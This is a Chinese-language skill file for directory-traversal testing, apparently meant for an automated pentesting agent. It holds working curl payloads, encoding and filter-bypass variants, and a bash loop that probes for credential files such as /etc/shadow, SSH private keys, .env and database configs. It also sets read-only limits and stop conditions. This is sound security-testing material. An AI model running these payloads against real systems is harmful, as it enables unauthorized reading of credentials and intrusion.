---
name: directory-traversal
description: 检测目录遍历（路径穿越）漏洞，验证文件访问是否被正确限制在 Web 根目录内。
category: web
source: xalgorix
tags:
  - 目录遍历
  - 路径穿越
  - 文件读取
  - OWASP Top 10
required_tools:
  - curl
---

# 目录遍历漏洞检测

## 适用场景

- 目标应用通过参数读取文件（如 `?file=report.pdf`、`?page=about`、`?template=email`）。
- 静态资源通过动态路径提供。
- 文件下载/导出功能接受用户指定的路径或文件名。

## 授权边界

- 目录遍历可能读取到系统配置文件、源码和凭证。仅验证可访问性，不读取完整敏感文件内容。
- 如发现可读取 `/etc/passwd` 或源码文件，记录路径即可，不持续深入文件系统。
- **禁止尝试覆盖或写入文件。** 本 skill 仅覆盖读取类目录遍历。

## 前置条件

- 已识别接受文件路径或包含文件引用参数的功能点。
- 了解目标服务器操作系统（Linux/Windows）以选择正确路径格式。

## 执行步骤

### 步骤 1：识别路径参数

```bash
# 常见路径参数
# ?file=, ?path=, ?page=, ?template=, ?load=, ?include=
# ?download=, ?doc=, ?attachment=, ?dir=
```

### 步骤 2：基础遍历测试（Linux）

```bash
# 标准路径穿越
curl "https://<target>/view?file=../../../etc/passwd"

# URL 编码
curl "https://<target>/view?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# 双层编码
curl "https://<target>/view?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

### 步骤 3：基础遍历测试（Windows）

```bash
# Windows 路径
curl "https://<target>/view?file=..\..\..\windows\win.ini"

# 混合分隔符
curl "https://<target>/view?file=../../windows/win.ini"

# UNC 路径（如果应用支持）
curl "https://<target>/view?file=\\127.0.0.1\share\file"
```

### 步骤 4：绕过过滤

```bash
# 路径规范化绕过
curl "https://<target>/view?file=....//....//....//etc/passwd"
curl "https://<target>/view?file=..;/..;/..;/etc/passwd"

# 绝对路径
curl "https://<target>/view?file=/etc/passwd"

# Null byte（旧版 PHP < 5.3.4）
curl "https://<target>/view?file=../../../etc/passwd%00.jpg"

# 起始路径限制绕过（如果应用强制加前缀 /var/www/）
curl "https://<target>/view?file=../../../etc/passwd"
```

### 步骤 5：敏感文件探测

```bash
# Linux 关键文件
FILES=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/proc/self/environ"
  "/home/<user>/.ssh/id_rsa"
  "/var/www/html/config.php"
  "/app/config/database.yml"
  ".env"
  ".git/config"
)

for f in "${FILES[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/view?file=../../../..$f")
  [ "$code" = "200" ] && echo "FOUND: $f"
done
```

## 停止条件

- 读取到 `/etc/shadow` 或 SSH 私钥等凭证文件时，停止并立即报告。
- 读取到数据库配置文件（含明文密码）时，停止并报告。
- 文件系统遍历范围超出 Web 应用目录时，仅记录关键发现，不进行全盘遍历。

## 输出格式

- 存在目录遍历的参数和端点。
- 成功的路径穿越 payload。
- 可访问的敏感文件列表（摘要，不含完整内容）。
- 绕过过滤的有效方法。

## 验收标准

1. 对所有接受文件路径的参数进行了基础目录遍历测试。
2. 测试了至少 5 种路径穿越变体（相对路径、绝对路径、编码、双层编码、规范化绕过）。
3. 探测了至少 5 个系统敏感文件路径。
4. 未读取完整敏感文件内容（仅验证可访问性和首行摘要）。
